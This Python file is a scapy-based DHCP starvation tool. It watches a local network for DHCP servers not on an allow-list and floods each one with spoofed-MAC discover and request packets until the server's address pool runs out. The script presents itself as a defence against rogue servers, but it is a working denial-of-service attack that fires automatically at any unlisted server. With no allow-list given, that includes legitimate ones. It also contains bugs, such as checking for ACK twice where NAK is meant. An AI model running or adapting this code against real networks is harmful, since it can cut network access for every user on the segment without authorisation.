from scapy.all import *
from random import randrange
import threading
import binascii
import argparse
import logging

DHCP_OPTIONS_DISCOVER = 1
DHCP_OPTIONS_OFFER = 2
DHCP_OPTIONS_REQUEST = 3
DHCP_OPTIONS_ACK = 5
DHCP_OPTIONS_NAK = 6

BOOTP_SPORT = 68
BOOTP_DPORT = 67
BOOTP_OPCODE = 1

SNIFFING_TIMEOUT = 4
PARAM_REQ_LIST = [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252]



class DHCP_Starvation:

    def __init__(self, authorized_servers, logger):
        self.currently_attacking = []
        self.authorized_servers = authorized_servers
        self.logger = logger


    def generate_mac(self):
        """
        Generates a mac address and a hardware address based on the mac.

        Return Value (tuple): containing the mac address and the hardware address.
        """

        mac = randrange(100000000000, 999999999999)
        mac = ':'.join(a+b for a, b in zip(str(mac)[::2], str(mac)[1::2]))
        chaddr = binascii.unhexlify(mac.replace(':', ''))
        return (mac, chaddr)


    def generate_dhcp_discover(self, mac, server_ip, chaddr, xid):
        """
        Generates a DHCP Discover packet. 

        Parameters:
        mac (string): The mac to be used in the src address.
        server_ip (string): IP address of the server attacked.
        chaddr (string): Binary of the mac address without the colons.
        xid (string): Random id for a single DHCP sequence.

        Return Value (scapy.packet): The DHCP Discover packet generated.
        """

        dhcp_discover = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / 
        IP(src='0.0.0.0', dst='255.255.255.255') / 
        UDP(dport=BOOTP_DPORT, sport=BOOTP_SPORT) / 
        BOOTP(op=BOOTP_OPCODE, xid=xid, chaddr=chaddr) / 
        DHCP(options=[('message-type','discover'), ('end')]))
        return dhcp_discover


    def listen_dhcp_offer(self):
        """
        Sniffing a single DHCP packet.

        Return Value (scapy.packet): The sniffed DHCP packet.
        """
        # Listen to dhcp offers
        dhcp_offer = sniff(
            count=1,
            timeout=SNIFFING_TIMEOUT,
            lfilter=lambda packet: DHCP in packet and packet[DHCP].options[0][1] == DHCP_OPTIONS_OFFER)
        return dhcp_offer


    def generate_dhcp_request(self, server_ip, requested_addr, mac, chaddr, xid):
        """
        Generates a DHCP Request packet.

        Parameters:
        server_ip (string): The attacked DHCP servers ip address.
        requested_addr (string): The ip address offered in the DHCP offer.
        mac (string): A generated MAC address.
        chaddr (string): Binary of the mac address without the colons.
        xid (string): Random id for a single DHCP sequence.

        Return Value (scapy.packet): The genrated packet.
        """  

        dhcp_request = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / 
        IP(src='0.0.0.0', dst=server_ip) / 
        UDP(dport=BOOTP_DPORT,sport=BOOTP_SPORT) / 
        BOOTP(op=BOOTP_OPCODE, xid=xid ,chaddr=chaddr) / 
        DHCP(options=[
            ('message-type','request'), 
            ('client_id', binascii.unhexlify((mac).replace(':', ''))),
            ('requested_addr', requested_addr), 
            ('server_id', server_ip), 
            ('param_req_list', PARAM_REQ_LIST),
            ('end')]))
        return dhcp_request


    def filter_dhcp_ack(self, packet, xid):
        """
        Filters for DHCP ACK or DHCP NAK packets.

        Parameters:
        packet (scapy.packet): The packet to filter.
        xid (string): The sequence id.

        Return Value (Boolean): True if the packet is ACK or NAK, False if not.
        """

        return (DHCP in packet 
        and (packet[DHCP].options[0][1] == DHCP_OPTIONS_ACK or packet[DHCP].options[0][1] == DHCP_OPTIONS_ACK)
        and packet[BOOTP].xid == xid)


    def listen_dhcp_ack(self, xid):
        """
        Sniffing a single DHCP Ack packet.

        Return Value (scapy.packet / NoneType): DHCP ACK packet / None.
        """
        dhcp_response = sniff(
        count=1,
        timeout=SNIFFING_TIMEOUT,
        lfilter=lambda packet: self.filter_dhcp_ack(packet, xid))
        return dhcp_response


    def starve_single_address(self, server_ip):
        """
        Starves a single address from the attacked DHCP server.

        Parameters:
        server_ip (string): The IP address of the attacked DHCP server.

        Return Value (Boolean): True if sniffed an ACK packet successfuly, False if failed .
        """
        (mac, chaddr) = self.generate_mac()
        xid = randrange(0, 100000)
        dhcp_discover = self.generate_dhcp_discover(mac, server_ip, chaddr, xid)
        self.logger.info('Sending dhcp discover')
        sendp(dhcp_discover, verbose=0)
        dhcp_offer = self.listen_dhcp_offer()

        if(len(dhcp_offer) == 0):
            logger.warning('No DHCP Offer Recieved')
            return False
        else:
            dhcp_offer = dhcp_offer[0]

        self.logger.info('Sending dhcp request...')
        requested_addr = dhcp_offer[BOOTP].yiaddr
        dhcp_request = self.generate_dhcp_request(server_ip, requested_addr, mac, chaddr, xid)
        sendp(dhcp_request, verbose=0)
        dhcp_ack = self.listen_dhcp_ack(xid)
        if(not dhcp_ack):
            self.logger.error(f'Failed to get ACK for {requested_addr}')
            return False
        elif(dhcp_ack[0][DHCP].options[0][1] == DHCP_OPTIONS_ACK):
            self.logger.info(f'Success to get ACK for {requested_addr}')
            return True
        elif(dhcp_ack[0][DHCP].options[0][1] == DHCP_OPTIONS_NAK):
            self.logger.info(f'Finished attack againts {server_ip} - Success!')
            return False
        


    def attack_dhcp_server(self, server_ip):
        """    
        Starves a single IP in a loop, until 5 consecutive failures or a NAK packet recieved.

        Parameters:
        server_ip (string): The attacked server IP

        Return Value (NoneType): None
        """

        self.logger.info(f'Initiating attack againts {server_ip}')

        self.currently_attacking.append(server_ip)
        
        consecutive_failures = 0

        while consecutive_failures < 5:
            is_address_starved = self.starve_single_address(server_ip)
            if(is_address_starved):
                consecutive_failures = 0
            else:
                consecutive_failures += 1

        self.currently_attacking.remove(server_ip)
        self.logger.info(f'Finished Attack againts {server_ip}')



def dhcp_filter(packet, authorized_servers, currently_attacking):
    """
    Filters packets to find DHCP packets sourced from a rogue server.

    Return Value (Boolean): For a single packet, the function will return true if:
    - DHCP is in the packet
    - The packet is either DHCPACK or DHCPOFFER (src is a server)
    - The packet src is not on the authorized server and not currently attacked
    """

    return (DHCP in packet
    and (packet[DHCP].options[0][1] == DHCP_OPTIONS_OFFER or packet[DHCP].options[0][1] == DHCP_OPTIONS_ACK)
    and packet[IP].src not in authorized_servers 
    and packet[IP].src not in currently_attacking)


def get_args():
    """
    Gets users arguments.

    Gets the arguments and append them to a global list of authorized servers.

    Return Value (lits): The authorized servers list
    """

    parser = argparse.ArgumentParser(description='Attack rogue DHCP servers on your network.')                    
    parser.add_argument("--allowed", help="Authorized servers that should not be attacked", nargs='+')
    authorized_servers = parser.parse_args().allowed
    if(authorized_servers is None):
        authorized_servers = []
    return authorized_servers
    


def main():
    """
    Sniff a packet sources from a rogue DHCP server and attacks it.

    Return Value (NoneType): None
    """

    logging.basicConfig(level=logging.INFO, format='%(asctime)s %(message)s', handlers=[logging.FileHandler('script.log'), logging.StreamHandler()])
    logger = logging.getLogger()
    logger.info('Listening to DHCP packets...')

    authorized_servers = get_args()
    dhcp_starvation = DHCP_Starvation(authorized_servers, logger)
    sniff(lfilter=lambda packet: dhcp_filter(packet, dhcp_starvation.authorized_servers, dhcp_starvation.currently_attacking), 
    prn=lambda packet: threading.Thread(target=dhcp_starvation.attack_dhcp_server, args=(packet[IP].src,)).start())

if(__name__ == '__main__'):
    main()
